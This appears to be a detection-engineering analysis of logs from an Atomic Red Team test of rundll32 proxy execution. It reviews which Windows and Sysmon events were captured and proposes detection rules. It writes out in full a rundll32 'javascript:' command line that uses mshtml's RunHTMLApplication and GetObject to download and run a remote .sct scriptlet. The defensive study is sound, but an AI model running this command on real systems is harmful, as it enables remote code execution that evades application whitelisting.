# T1218.011-1: Rundll32 — Rundll32 Execute JavaScript Remote Payload With GetObject

## Technique Context

T1218.011 (Signed Binary Proxy Execution: Rundll32) exploits the fact that `rundll32.exe` is a Microsoft-signed system binary trusted by application whitelisting and most EDR tools. By abusing its ability to load arbitrary DLLs and call exported functions, attackers can execute malicious code under the cover of a legitimate Windows process.

This specific test uses the `javascript:` protocol handler variant — one of the more creative abuses of rundll32. The command line is:

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();
GetObject("script:https://<url>/T1218.011.sct").Exec();window.close();
```

This works because rundll32 can be tricked into loading `mshtml.dll` (the HTML rendering engine) and calling its `RunHTMLApplication` export, which creates an HTA execution context. From there, JavaScript executes `GetObject("script:<URL>")`, which invokes the COM SCT (scriptlet) moniker to download and execute a remote `.sct` file. The `.sct` file contains arbitrary code that runs under the rundll32.exe process context.

This technique chains together several clever abuses: a signed binary (rundll32), a protocol handler (javascript:), a system DLL (mshtml), COM monikers (script:), and remote code loading (the .sct URL). Each component is individually legitimate, but the combination is almost exclusively seen in attacks.

The detection community focuses on:

- **`rundll32.exe javascript:` in any command line** — this has zero legitimate use and is a near-certain indicator of malicious activity
- **`RunHTMLApplication` in any command line** — abusing mshtml's HTA entry point
- **`GetObject("script:http`)** — COM scriptlet execution via URL moniker
- **Network connections from rundll32.exe** (Sysmon EID 3) to external hosts
- **Unusual DLL loads into rundll32** (Sysmon EID 7) — particularly mshtml.dll, jscript9.dll, scrobj.dll

## What This Dataset Contains

The **Security 4688 (Process Creation)** event is the standout artifact. It contains the complete attack command line in a single event:

```
"cmd.exe" /c rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";
document.write();GetObject("script:https://raw.githubusercontent.com/
redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct").Exec();
window.close();
```

Every detection keyword the community looks for is present: `rundll32.exe`, `javascript:`, `mshtml`, `RunHTMLApplication`, `GetObject`, `script:https://`. A detection engineer could write five independent rules — each matching a different component of this chain — and validate all of them against this single event.

The Sysmon channel captured a **CreateRemoteThread (EID 8)** from PowerShell into the short-lived cmd.exe process (PID 15836, matching the Security 4688 process). The target appears as `<unknown process>` because it exited before Sysmon resolved the image name — consistent with the rapid sequence of launch → block → exit.

The Security channel also shows the cmd.exe process **exiting with 0xC0000022 (STATUS_ACCESS_DENIED)**, indicating Windows Defender or SmartScreen intercepted the JavaScript execution. This blocked-attempt outcome is important context: it confirms the security controls detected the technique, which is itself a useful data point for understanding defense effectiveness.

A subtle but useful detail: Sysmon captured **urlmon.dll being loaded into PowerShell** (EID 7). The URL Moniker library is the COM infrastructure that handles `GetObject("script:URL")` calls. While urlmon.dll loads into PowerShell for various legitimate reasons, its presence in the context of other indicators strengthens a composite detection.

## What This Dataset Does Not Contain

**No Sysmon EID 1 (ProcessCreate) for cmd.exe or rundll32.exe.** This is the most consequential gap. The technique process creations are only visible in Security 4688, not in Sysmon. Detection engineers building rules exclusively on Sysmon EID 1 — which is common in Sigma rule repositories — would find no technique evidence in this dataset. This highlights the importance of Security 4688 with command-line auditing as a complementary data source.

The absence of Sysmon EID 1 likely means rundll32.exe never fully launched as a separate process. The `javascript:` trick requires mshtml.dll to be loaded, and Defender probably intercepted the chain before that happened. Alternatively, the Sysmon configuration's ProcessCreate filters may not have captured cmd.exe in this execution context.

**No network events.** Because execution was blocked before `GetObject("script:https://...")` could fetch the remote SCT file, there is no DNS query to `raw.githubusercontent.com` and no outbound HTTPS connection. A successful execution would produce Sysmon EID 22 (DNS query) and EID 3 (network connection) to GitHub's infrastructure, which are valuable network-layer detection opportunities.

**No DLL load events for the JavaScript engine.** A successful execution would show mshtml.dll, jscript9.dll, and potentially scrobj.dll (the COM scriptlet runtime) being loaded into rundll32.exe — all captured via Sysmon EID 7. These are absent because the technique was blocked before the DLL loading stage.

**The PowerShell channel is effectively empty of technique content.** 35 of 37 events are `Set-StrictMode` scriptblock boilerplate. The remaining 2 are `Set-ExecutionPolicy Bypass` from the test framework. The attack was an external process launch (`cmd.exe /c rundll32.exe ...`), not PowerShell code, so ScriptBlock Logging has no visibility into it.

## Assessment

This dataset's value is concentrated in a single Security 4688 event — but that event is excellent. It contains every keyword and pattern that the detection community uses for T1218.011 identification. For command-line-based detection rules, this is sufficient to develop and validate against.

The behavioral telemetry that would be present in a successful execution — DLL loads into rundll32 (especially mshtml, jscript, scrobj), network connections to the SCT hosting URL, and the rundll32 process creation itself in Sysmon — is absent because Defender blocked the technique early. This means the dataset is useful for Tier 1 detections (command-line pattern matching) but not for Tier 2 detections (behavioral analysis of the execution chain).

A broader observation: rundll32 abuse techniques in general are well-caught by command-line logging because the command lines are inherently distinctive. The `javascript:` protocol handler trick, `RunHTMLApplication`, and `GetObject("script:")` are patterns that essentially never appear in legitimate operations. This makes T1218.011 one of the more detectable techniques in the MITRE ATT&CK framework, provided command-line auditing is enabled.

## Detection Opportunities Present in This Data

1. **`rundll32.exe javascript:` pattern** (Security 4688): Match any process creation where `CommandLine` contains both `rundll32` and `javascript:`. Near-zero false-positive rate. This is the highest-confidence detection for this technique variant.

2. **`RunHTMLApplication` in any command line** (Security 4688): The `mshtml,RunHTMLApplication` export is not used by any legitimate software. Its presence in a command line is definitively malicious.

3. **`GetObject("script:http` pattern** (Security 4688): COM scriptlet execution via URL moniker. The `script:` protocol prefix combined with an HTTP URL indicates remote code execution via COM.

4. **CreateRemoteThread to an unknown/short-lived process** (Sysmon EID 8): The source being a scripting engine (PowerShell) and the target being `<unknown process>` with an empty StartModule indicates either injection into a transient process or a process that was killed before Sysmon could resolve it.

5. **STATUS_ACCESS_DENIED exit code** (Security 4689): A process that attempted to execute a LOLBin technique and was blocked (exit 0xC0000022) indicates an attack that was caught by endpoint protection. This is a "near miss" indicator worth tracking — the attacker was present and attempting techniques, even if this one didn't succeed.

## Environment Note

This test was executed on a Windows 11 Enterprise workstation (ACME-WS02) with Windows Defender active, Sysmon with the SysmonDrv kernel minifilter driver, and Advanced Audit Policy with command-line logging enabled. The test ran as NT AUTHORITY\SYSTEM via the QEMU guest agent.
